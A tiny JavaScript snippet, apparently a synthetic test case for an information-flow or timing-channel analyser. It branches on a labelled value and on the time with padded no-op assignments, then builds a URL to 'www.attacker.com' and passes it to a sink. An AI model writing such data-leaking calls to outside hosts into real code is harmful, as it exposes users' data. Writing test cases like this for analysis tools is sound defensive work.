var i =  Math.floor((Math.random() * 10) + 1); 


var h = lbl(i);

var t =  Date.now();

if (t%2 == 1) {t = t;}
else {t = t;t = t;t = t;t = t;t = t;t = t;t = t;}

if (h%2 == 1) {h = h;}
else {h = h;h = h;h = h;h = h;h = h;h = h;h = h;}


url = urll("www.attacker.com" + 1);
sink('Sink', '', url);